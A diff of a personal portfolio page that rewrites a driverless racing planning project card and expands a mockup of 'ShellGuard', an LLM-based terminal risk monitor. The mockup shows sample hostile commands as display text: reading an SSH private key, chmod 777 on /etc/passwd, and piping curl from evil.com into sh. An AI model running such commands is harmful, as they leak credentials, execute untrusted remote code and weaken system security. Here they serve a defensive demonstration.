@@ -88,67 +88,76 @@
       </div>
     </section>
 
+    <!-- Category Filter + Article List -->
+    <section class="category-directory fade-in">
+      <h2 class="section-title section-title-fancy">Articles</h2>
+      <div class="category-grid" id="category-grid">
+        <!-- populated by JS -->
+      </div>
+      <div id="category-articles-container"></div>
+      <div id="all-articles" class="all-articles">
+        <div id="post-list" class="post-list"></div>
+      </div>
+    </section>
+
     <!-- Projects -->
     <section id="projects" class="projects-section fade-in">
       <h2 class="section-title section-title-fancy">Projects</h2>
       <div class="project-grid">
 
-        <!-- Planning — ROS Autonomous Racing Robot -->
+        <!-- Planning — FSAC Driverless Formula -->
         <div class="project-card project-card-featured">
           <div class="project-card-header">
             <div class="project-icon project-icon-ros">
               <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><circle cx="12" cy="12" r="10"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/><path d="M2 12h20"/></svg>
             </div>
             <div>
-              <h3>Planning — Autonomous Racing Robot</h3>
-              <span class="project-tech">C++ · ROS · PCL · RANSAC</span>
+              <h3>FSAC Planning — 无人方程式规划模块</h3>
+              <span class="project-tech">C++ · ROS · PCL · CGAL · Eigen</span>
             </div>
             <a href="https://github.com/ChenSchenG" target="_blank" rel="noopener" class="project-gh-link" title="GitHub">
-              <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.376.6.11.82-.26.82-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.73.083-.73 1.205.085 1.84 1.237 1.84 1.237 1.07 1.834 2.807 1.304 3.492.997.108-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23A11.509 11.509 0 0112 5.803c1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.218.694.825.576C20.565 21.795 24 17.31 24 12c0-6.63-5.37-12-12-12z"/></svg>
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.113.82-.258.82-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.73.083-.73 1.205.085 1.84 1.237 1.84 1.237 1.07 1.834 2.807 1.304 3.492.997.108-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23A11.509 11.509 0 0112 5.803c1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.218.694.825.576C20.565 21.795 24 17.31 24 12c0-6.63-5.37-12-12-12z"/></svg>
             </a>
           </div>
-          <p class="project-desc">ROS-based autonomous racing robot with Point Cloud Library for real-time LiDAR processing. Implements RANSAC-based line detection and path planning algorithms for three competitive racing events.</p>
+          <p class="project-desc">中国大学生无人驾驶方程式大赛（FSAC）路径规划模块。基于 ROS 与 PCL 处理 LiDAR 点云数据，为三个竞速赛项实现了不同的感知与规划算法，完成从点云到路径的全链路闭环。</p>
 
           <div class="project-events">
             <!-- Acceleration -->
             <div class="event-card">
               <div class="event-visual event-accel">
                 <svg viewBox="0 0 320 120" class="event-svg">
-                  <line x1="30" y1="60" x2="290" y2="60" stroke="#e0e0e0" stroke-width="2" stroke-dasharray="8 4"/>
-                  <line x1="30" y1="40" x2="290" y2="40" stroke="#27ae60" stroke-width="1.5" opacity="0.4"/>
-                  <line x1="30" y1="80" x2="290" y2="80" stroke="#27ae60" stroke-width="1.5" opacity="0.4"/>
-                  <!-- RANSAC detected line -->
-                  <line x1="30" y1="60" x2="290" y2="60" stroke="#e74c3c" stroke-width="2" class="ransac-line"/>
-                  <!-- Point cloud dots -->
+                  <!-- Track boundaries -->
+                  <line x1="30" y1="35" x2="290" y2="35" stroke="#27ae60" stroke-width="1.5" opacity="0.4"/>
+                  <line x1="30" y1="85" x2="290" y2="85" stroke="#27ae60" stroke-width="1.5" opacity="0.4"/>
+                  <!-- Scatter point cloud (noisy) -->
                   <g class="pcl-points">
-                    <circle cx="50" cy="58" r="2" fill="#2980b9" opacity="0.7"/>
-                    <circle cx="70" cy="62" r="2" fill="#2980b9" opacity="0.7"/>
-                    <circle cx="90" cy="57" r="2" fill="#2980b9" opacity="0.7"/>
-                    <circle cx="110" cy="63" r="2" fill="#2980b9" opacity="0.7"/>
-                    <circle cx="130" cy="59" r="2" fill="#2980b9" opacity="0.7"/>
-                    <circle cx="150" cy="61" r="2" fill="#2980b9" opacity="0.7"/>
-                    <circle cx="170" cy="58" r="2" fill="#2980b9" opacity="0.7"/>
-                    <circle cx="190" cy="64" r="2" fill="#2980b9" opacity="0.7"/>
-                    <circle cx="210" cy="57" r="2" fill="#2980b9" opacity="0.7"/>
-                    <circle cx="230" cy="62" r="2" fill="#2980b9" opacity="0.7"/>
-                    <circle cx="250" cy="59" r="2" fill="#2980b9" opacity="0.7"/>
-                    <circle cx="270" cy="61" r="2" fill="#2980b9" opacity="0.7"/>
+                    <circle cx="50" cy="37" r="1.5" fill="#2980b9" opacity="0.6"/><circle cx="75" cy="33" r="1.5" fill="#2980b9" opacity="0.6"/>
+                    <circle cx="100" cy="36" r="1.5" fill="#2980b9" opacity="0.6"/><circle cx="130" cy="34" r="1.5" fill="#2980b9" opacity="0.6"/>
+                    <circle cx="155" cy="38" r="1.5" fill="#2980b9" opacity="0.6"/><circle cx="185" cy="33" r="1.5" fill="#2980b9" opacity="0.6"/>
+                    <circle cx="210" cy="37" r="1.5" fill="#2980b9" opacity="0.6"/><circle cx="240" cy="34" r="1.5" fill="#2980b9" opacity="0.6"/>
+                    <circle cx="265" cy="36" r="1.5" fill="#2980b9" opacity="0.6"/>
+                    <circle cx="55" cy="87" r="1.5" fill="#2980b9" opacity="0.6"/><circle cx="80" cy="83" r="1.5" fill="#2980b9" opacity="0.6"/>
+                    <circle cx="110" cy="86" r="1.5" fill="#2980b9" opacity="0.6"/><circle cx="140" cy="84" r="1.5" fill="#2980b9" opacity="0.6"/>
+                    <circle cx="165" cy="88" r="1.5" fill="#2980b9" opacity="0.6"/><circle cx="195" cy="83" r="1.5" fill="#2980b9" opacity="0.6"/>
+                    <circle cx="220" cy="87" r="1.5" fill="#2980b9" opacity="0.6"/><circle cx="250" cy="84" r="1.5" fill="#2980b9" opacity="0.6"/>
+                    <circle cx="275" cy="86" r="1.5" fill="#2980b9" opacity="0.6"/>
                   </g>
-                  <!-- Robot -->
+                  <!-- RANSAC fitted center line -->
+                  <line x1="30" y1="60" x2="290" y2="60" stroke="#e74c3c" stroke-width="2" class="ransac-line"/>
+                  <text x="295" y="60" font-size="7" fill="#e74c3c" dominant-baseline="middle">RANSAC</text>
+                  <!-- Car -->
                   <g class="robot-accel">
-                    <rect x="30" y="50" width="18" height="12" rx="3" fill="#333" stroke="#555" stroke-width="1"/>
-                    <circle cx="35" cy="64" r="3" fill="#666" stroke="#888" stroke-width="0.5"/>
-                    <circle cx="43" cy="64" r="3" fill="#666" stroke="#888" stroke-width="0.5"/>
-                    <line x1="48" y1="54" x2="54" y2="50" stroke="#e74c3c" stroke-width="1.5" stroke-linecap="round"/>
+                    <rect x="28" y="52" width="20" height="14" rx="4" fill="#333" stroke="#555" stroke-width="0.8"/>
+                    <rect x="30" y="54" width="6" height="4" rx="1" fill="#6cf" opacity="0.6"/>
+                    <circle cx="33" cy="68" r="2.5" fill="#666"/><circle cx="43" cy="68" r="2.5" fill="#666"/>
                   </g>
-                  <!-- Start/Finish flags -->
-                  <text x="30" y="100" font-size="9" fill="#999" text-anchor="middle">START</text>
-                  <text x="290" y="100" font-size="9" fill="#999" text-anchor="middle">FINISH</text>
+                  <text x="30" y="108" font-size="8" fill="#999" text-anchor="middle">START</text>
+                  <text x="290" y="108" font-size="8" fill="#999" text-anchor="middle">FINISH</text>
                 </svg>
               </div>
               <div class="event-info">
                 <h4>🏎️ Acceleration <span class="event-cn">加速赛</span></h4>
-                <p>Straight-line speed run using RANSAC line detection on LiDAR point clouds. The robot detects track boundaries and follows the optimal center path at maximum velocity.</p>
+                <p>基于 RANSAC 随机采样一致性对 LiDAR 点云进行左右边界线拟合（Eigen QR 分解），取中线作为行驶路径。支持双车道中线融合与单车道偏移回退，EMA 时序平滑（α=0.3）消除抖动。</p>
               </div>
             </div>
 
@@ -156,14 +165,26 @@
             <div class="event-card">
               <div class="event-visual event-skidpad">
                 <svg viewBox="0 0 320 120" class="event-svg">
-                  <!-- Figure-8 track -->
-                  <ellipse cx="120" cy="60" rx="55" ry="40" fill="none" stroke="#e0e0e0" stroke-width="8" opacity="0.3"/>
-                  <ellipse cx="200" cy="60" rx="55" ry="40" fill="none" stroke="#e0e0e0" stroke-width="8" opacity="0.3"/>
-                  <ellipse cx="120" cy="60" rx="55" ry="40" fill="none" stroke="#27ae60" stroke-width="1.5" stroke-dasharray="4 3" opacity="0.5"/>
-                  <ellipse cx="200" cy="60" rx="55" ry="40" fill="none" stroke="#27ae60" stroke-width="1.5" stroke-dasharray="4 3" opacity="0.5"/>
-                  <!-- Path trace -->
-                  <path d="M160,60 C160,30 90,20 90,60 C90,100 160,90 160,60 C160,30 230,20 230,60 C230,100 160,90 160,60" fill="none" stroke="#e74c3c" stroke-width="1.5" stroke-dasharray="300" stroke-dashoffset="300" class="skidpad-path"/>
-                  <!-- Robot on path -->
+                  <!-- Prior map (gray) -->
+                  <ellipse cx="115" cy="60" rx="50" ry="38" fill="none" stroke="#ccc" stroke-width="5" opacity="0.3"/>
+                  <ellipse cx="205" cy="60" rx="50" ry="38" fill="none" stroke="#ccc" stroke-width="5" opacity="0.3"/>
+                  <!-- Scan cloud dots -->
+                  <g class="pcl-points">
+                    <circle cx="68" cy="48" r="1.5" fill="#8e44ad" opacity="0.5"/><circle cx="78" cy="30" r="1.5" fill="#8e44ad" opacity="0.5"/>
+                    <circle cx="100" cy="24" r="1.5" fill="#8e44ad" opacity="0.5"/><circle cx="130" cy="23" r="1.5" fill="#8e44ad" opacity="0.5"/>
+                    <circle cx="155" cy="35" r="1.5" fill="#8e44ad" opacity="0.5"/><circle cx="160" cy="85" r="1.5" fill="#8e44ad" opacity="0.5"/>
+                    <circle cx="135" cy="95" r="1.5" fill="#8e44ad" opacity="0.5"/><circle cx="100" cy="96" r="1.5" fill="#8e44ad" opacity="0.5"/>
+                    <circle cx="75" cy="82" r="1.5" fill="#8e44ad" opacity="0.5"/><circle cx="170" cy="30" r="1.5" fill="#8e44ad" opacity="0.5"/>
+                    <circle cx="200" cy="23" r="1.5" fill="#8e44ad" opacity="0.5"/><circle cx="230" cy="25" r="1.5" fill="#8e44ad" opacity="0.5"/>
+                    <circle cx="250" cy="42" r="1.5" fill="#8e44ad" opacity="0.5"/><circle cx="252" cy="78" r="1.5" fill="#8e44ad" opacity="0.5"/>
+                    <circle cx="230" cy="94" r="1.5" fill="#8e44ad" opacity="0.5"/><circle cx="200" cy="97" r="1.5" fill="#8e44ad" opacity="0.5"/>
+                  </g>
+                  <!-- Aligned result (figure-8 path) -->
+                  <path d="M160,60 C160,28 90,18 90,60 C90,100 160,92 160,60 C160,28 230,18 230,60 C230,100 160,92 160,60" fill="none" stroke="#e74c3c" stroke-width="1.5" stroke-dasharray="300" stroke-dashoffset="300" class="skidpad-path"/>
+                  <!-- Labels -->
+                  <text x="115" cy="60" y="62" font-size="7" fill="#999" text-anchor="middle">SAC-IA</text>
+                  <text x="205" y="62" font-size="7" fill="#999" text-anchor="middle">ICP</text>
+                  <!-- Car on path -->
                   <g class="robot-skidpad">
                     <circle cx="160" cy="60" r="5" fill="#333" stroke="#555" stroke-width="1"/>
                     <circle cx="160" cy="60" r="2" fill="#e74c3c"/>
@@ -171,8 +192,8 @@
                 </svg>
               </div>
               <div class="event-info">
-                <h4>🔄 Skidpad <span class="event-cn">绕桩赛</span></h4>
-                <p>Figure-8 navigation using skidpad path publisher and cone detection. The robot calculates optimal turning radius through two circular laps while maintaining stability.</p>
+                <h4>🔄 Skidpad <span class="event-cn">八字绕环</span></h4>
+                <p>两阶段点云配准定位：先通过 SAC-IA（FPFH 特征 + 采样一致性初始对齐）获得粗匹配，再经 ICP（迭代最近点）精配准，输出 3-DOF 平面变换矩阵（x, y, yaw），实现与先验地图的实时对齐。</p>
               </div>
             </div>
 
@@ -180,26 +201,59 @@
             <div class="event-card">
               <div class="event-visual event-tracking">
                 <svg viewBox="0 0 320 120" class="event-svg">
-                  <!-- Track boundary -->
-                  <path d="M40,80 Q80,20 160,30 Q240,40 280,80 Q260,110 160,100 Q60,110 40,80Z" fill="none" stroke="#e0e0e0" stroke-width="6" opacity="0.3"/>
-                  <path d="M40,80 Q80,20 160,30 Q240,40 280,80 Q260,110 160,100 Q60,110 40,80Z" fill="none" stroke="#27ae60" stroke-width="1.5" stroke-dasharray="4 3" opacity="0.5"/>
-                  <!-- Inner boundary -->
-                  <path d="M80,75 Q100,40 160,45 Q220,50 245,75 Q230,95 160,88 Q90,95 80,75Z" fill="none" stroke="#27ae60" stroke-width="1.5" stroke-dasharray="4 3" opacity="0.5"/>
-                  <!-- Racing line -->
-                  <path d="M60,78 Q90,28 160,37 Q232,45 265,78 Q245,103 160,94 Q75,103 60,78Z" fill="none" stroke="#e74c3c" stroke-width="1.5" class="tracking-path" stroke-dasharray="400" stroke-dashoffset="400"/>
-                  <!-- Lap counter -->
-                  <rect x="45" y="70" width="2" height="18" fill="#8e44ad"/>
-                  <text x="55" y="66" font-size="8" fill="#8e44ad" font-weight="600">LAP</text>
-                  <!-- Robot -->
+                  <!-- Outer boundary cones -->
+                  <g>
+                    <circle cx="60" cy="85" r="3" fill="#f39c12" opacity="0.5"/><circle cx="90" cy="40" r="3" fill="#f39c12" opacity="0.5"/>
+                    <circle cx="130" cy="25" r="3" fill="#f39c12" opacity="0.5"/><circle cx="180" cy="22" r="3" fill="#f39c12" opacity="0.5"/>
+                    <circle cx="230" cy="30" r="3" fill="#f39c12" opacity="0.5"/><circle cx="265" cy="55" r="3" fill="#f39c12" opacity="0.5"/>
+                    <circle cx="270" cy="90" r="3" fill="#f39c12" opacity="0.5"/><circle cx="230" cy="105" r="3" fill="#f39c12" opacity="0.5"/>
+                    <circle cx="170" cy="108" r="3" fill="#f39c12" opacity="0.5"/><circle cx="110" cy="105" r="3" fill="#f39c12" opacity="0.5"/>
+                  </g>
+                  <!-- Inner boundary cones -->
+                  <g>
+                    <circle cx="100" cy="65" r="3" fill="#2980b9" opacity="0.5"/><circle cx="130" cy="48" r="3" fill="#2980b9" opacity="0.5"/>
+                    <circle cx="170" cy="42" r="3" fill="#2980b9" opacity="0.5"/><circle cx="210" cy="48" r="3" fill="#2980b9" opacity="0.5"/>
+                    <circle cx="235" cy="68" r="3" fill="#2980b9" opacity="0.5"/><circle cx="220" cy="88" r="3" fill="#2980b9" opacity="0.5"/>
+                    <circle cx="180" cy="92" r="3" fill="#2980b9" opacity="0.5"/><circle cx="140" cy="90" r="3" fill="#2980b9" opacity="0.5"/>
+                  </g>
+                  <!-- Delaunay triangle edges (faint) -->
+                  <g class="delaunay-edges" opacity="0.15" stroke="#8e44ad" stroke-width="0.8">
+                    <line x1="60" y1="85" x2="100" y2="65"/><line x1="90" y1="40" x2="130" y2="48"/>
+                    <line x1="130" y1="25" x2="130" y2="48"/><line x1="130" y1="25" x2="170" y2="42"/>
+                    <line x1="180" y1="22" x2="170" y2="42"/><line x1="180" y1="22" x2="210" y2="48"/>
+                    <line x1="230" y1="30" x2="210" y2="48"/><line x1="265" y1="55" x2="235" y2="68"/>
+                    <line x1="270" y1="90" x2="220" y2="88"/><line x1="230" y1="105" x2="220" y2="88"/>
+                    <line x1="230" y1="105" x2="180" y2="92"/><line x1="170" y1="108" x2="180" y2="92"/>
+                    <line x1="170" y1="108" x2="140" y2="90"/><line x1="110" y1="105" x2="140" y2="90"/>
+                    <line x1="110" y1="105" x2="100" y2="65"/>
+                  </g>
+                  <!-- Midpoint racing line (Delaunay midpoints, greedy sorted) -->
+                  <path d="M80,75 Q110,42 150,35 Q195,32 248,62 Q250,89 200,98 Q155,100 125,88 Q85,85 80,75" fill="none" stroke="#e74c3c" stroke-width="2" class="tracking-path" stroke-dasharray="420" stroke-dashoffset="420"/>
+                  <!-- Midpoint dots -->
+                  <g class="midpoints">
+                    <circle cx="80" cy="75" r="2" fill="#e74c3c" opacity="0.7"/>
+                    <circle cx="110" cy="44" r="2" fill="#e74c3c" opacity="0.7"/>
+                    <circle cx="150" cy="35" r="2" fill="#e74c3c" opacity="0.7"/>
+                    <circle cx="195" cy="32" r="2" fill="#e74c3c" opacity="0.7"/>
+                    <circle cx="248" cy="62" r="2" fill="#e74c3c" opacity="0.7"/>
+                    <circle cx="245" cy="89" r="2" fill="#e74c3c" opacity="0.7"/>
+                    <circle cx="200" cy="98" r="2" fill="#e74c3c" opacity="0.7"/>
+                    <circle cx="155" cy="99" r="2" fill="#e74c3c" opacity="0.7"/>
+                    <circle cx="125" cy="88" r="2" fill="#e74c3c" opacity="0.7"/>
+                  </g>
+                  <!-- Lap line -->
+                  <rect x="68" y="73" width="2" height="16" fill="#8e44ad"/>
+                  <text x="58" y="70" font-size="7" fill="#8e44ad" font-weight="600">LAP</text>
+                  <!-- Car -->
                   <g class="robot-tracking">
-                    <circle cx="60" cy="78" r="5" fill="#333" stroke="#555" stroke-width="1"/>
-                    <circle cx="60" cy="78" r="2" fill="#e74c3c"/>
+                    <circle cx="80" cy="75" r="5" fill="#333" stroke="#555" stroke-width="1"/>
+                    <circle cx="80" cy="75" r="2" fill="#e74c3c"/>
                   </g>
                 </svg>
               </div>
               <div class="event-info">
-                <h4>🏁 Tracking <span class="event-cn">追踪赛</span></h4>
-                <p>Multi-lap boundary detection with lap counting. Uses PCL to process LiDAR data, detect track edges, and navigate the closed-loop circuit at competitive speeds.</p>
+                <h4>🏁 Trackdrive <span class="event-cn">循迹赛</span></h4>
+                <p>使用 CGAL Delaunay 三角剖分连接左右锥桶点云，筛选跨类型边并提取中点作为候选路径点，再通过贪心排序（距离 + 航向角 + 前方奖励加权评分）生成有序路径。首圈保守截断，后续圈全图扩展。</p>
               </div>
             </div>
           </div>
@@ -216,12 +270,12 @@
               <span class="project-tech">Python · Rich TUI · LLM · Security</span>
             </div>
             <a href="https://github.com/ChenSchenG" target="_blank" rel="noopener" class="project-gh-link" title="GitHub">
-              <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.376.6.11.82-.26.82-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.73.083-.73 1.205.085 1.84 1.237 1.84 1.237 1.07 1.834 2.807 1.304 3.492.997.108-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23A11.509 11.509 0 0112 5.803c1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.218.694.825.576C20.565 21.795 24 17.31 24 12c0-6.63-5.37-12-12-12z"/></svg>
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.113.82-.258.82-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.73.083-.73 1.205.085 1.84 1.237 1.84 1.237 1.07 1.834 2.807 1.304 3.492.997.108-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23A11.509 11.509 0 0112 5.803c1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.218.694.825.576C20.565 21.795 24 17.31 24 12c0-6.63-5.37-12-12-12z"/></svg>
             </a>
           </div>
-          <p class="project-desc">AI-powered terminal security monitor that captures shell commands in real-time, analyzes risk levels using LLM, and provides a beautiful Rich TUI dashboard for security monitoring.</p>
+          <p class="project-desc">AI 驱动的终端安全监控工具。通过 Shell Hook 实时捕获命令，接入 LLM 进行风险分析并分级（LOW / MED / HIGH / CRIT），提供 Rich TUI 仪表盘与自然语言问答功能。</p>
 
-          <!-- Terminal mockup -->
+          <!-- TUI Dashboard Mockup -->
           <div class="terminal-mockup">
             <div class="terminal-bar">
               <span class="terminal-dot" style="background:#ff5f56"></span>
@@ -230,34 +284,70 @@
               <span class="terminal-title">ShellGuard Dashboard</span>
             </div>
             <div class="terminal-body">
-              <div class="terminal-line">
-                <span class="t-prompt">$</span>
-                <span class="t-cmd">pip install -r requirements.txt</span>
-                <span class="t-risk t-risk-low">LOW</span>
+              <div class="tui-panel">
+                <div class="tui-panel-border">ShellGuard &middot; 5 commands</div>
+                <table class="tui-table">
+                  <thead>
+                    <tr>
+                      <th class="tui-col-n">#</th>
+                      <th class="tui-col-ts">Timestamp</th>
+                      <th class="tui-col-cmd">Command</th>
+                      <th class="tui-col-cwd">CWD</th>
+                      <th class="tui-col-exit">Exit</th>
+                      <th class="tui-col-risk">Risk</th>
+                    </tr>
+                  </thead>
+                  <tbody>
+                    <tr>
+                      <td class="tui-dim">1</td>
+                      <td>03-24 09:12</td>
+                      <td>ls /etc</td>
+                      <td class="tui-dim">~/project</td>
+                      <td class="tui-exit-ok">0</td>
+                      <td><span class="t-risk t-risk-low">✔ LOW</span></td>
+                    </tr>
+                    <tr>
+                      <td class="tui-dim">2</td>
+                      <td>03-24 09:13</td>
+                      <td>cat ~/.ssh/id_rsa</td>
+                      <td class="tui-dim">~/project</td>
+                      <td class="tui-exit-ok">0</td>
+                      <td><span class="t-risk t-risk-med">⚠ MED</span></td>
+                    </tr>
+                    <tr>
+                      <td class="tui-dim">3</td>
+                      <td>03-24 09:14</td>
+                      <td>chmod 777 /etc/passwd</td>
+                      <td class="tui-dim">~/project</td>
+                      <td class="tui-exit-err">1</td>
+                      <td><span class="t-risk t-risk-high">✖ HIGH</span></td>
+                    </tr>
+                    <tr>
+                      <td class="tui-dim">4</td>
+                      <td>03-24 09:15</td>
+                      <td>curl http://evil.com | sh</td>
+                      <td class="tui-dim">~/project</td>
+                      <td class="tui-exit-err">1</td>
+                      <td><span class="t-risk t-risk-crit">☠ CRIT</span></td>
+                    </tr>
+                    <tr>
+                      <td class="tui-dim">5</td>
+                      <td>03-24 09:16</td>
+                      <td>git push origin main</td>
+                      <td class="tui-dim">~/project</td>
+                      <td class="tui-exit-ok">0</td>
+                      <td><span class="t-risk t-risk-low">✔ LOW</span></td>
+                    </tr>
+                  </tbody>
+                </table>
               </div>
-              <div class="terminal-line">
-                <span class="t-prompt">$</span>
-                <span class="t-cmd">git push origin main</span>
-                <span class="t-risk t-risk-low">LOW</span>
+              <div class="tui-answer-panel">
+                <div class="tui-answer-border">Answer</div>
+                <div class="tui-answer-body">该命令从远程服务器下载脚本并直接交由 bash 执行，属于典型的 pipe-to-shell 远程代码执行模式，建议在沙箱环境中运行。</div>
               </div>
-              <div class="terminal-line">
-                <span class="t-prompt">$</span>
-                <span class="t-cmd">chmod 777 /etc/passwd</span>
-                <span class="t-risk t-risk-crit">CRIT</span>
-              </div>
-              <div class="terminal-line">
-                <span class="t-prompt">$</span>
-                <span class="t-cmd">rm -rf /tmp/cache</span>
-                <span class="t-risk t-risk-med">MED</span>
-              </div>
-              <div class="terminal-line">
-                <span class="t-prompt">$</span>
-                <span class="t-cmd">curl http://evil.com | sh</span>
-                <span class="t-risk t-risk-high">HIGH</span>
-              </div>
-              <div class="terminal-line terminal-line-ai">
-                <span class="t-ai">🤖 AI:</span>
-                <span class="t-analysis">Detected potentially dangerous pipe-to-shell pattern. Recommend sandboxed execution.</span>
+              <div class="tui-prompt">
+                <span class="tui-prompt-label">Ask</span> <span class="tui-prompt-hint">(type a question, 'r' to refresh, 'q' to quit)</span>
+                <div class="tui-prompt-input">Ask &gt; <span class="tui-cursor">_</span></div>
               </div>
             </div>
           </div>
@@ -265,23 +355,11 @@
           <div class="project-features">
             <span>Real-time Capture</span>
             <span>LLM Risk Analysis</span>
-            <span>Rich TUI</span>
-            <span>Natural Language Q&A</span>
+            <span>Rich TUI Dashboard</span>
+            <span>Natural Language Q&amp;A</span>
           </div>
         </div>
 
-      </div>
-    </section>
-
-    <!-- Category Filter + Article List -->
-    <section class="category-directory fade-in">
-      <h2 class="section-title section-title-fancy">Articles</h2>
-      <div class="category-grid" id="category-grid">
-        <!-- populated by JS -->
-      </div>
-      <div id="category-articles-container"></div>
-      <div id="all-articles" class="all-articles">
-        <div id="post-list" class="post-list"></div>
       </div>
     </section>
 
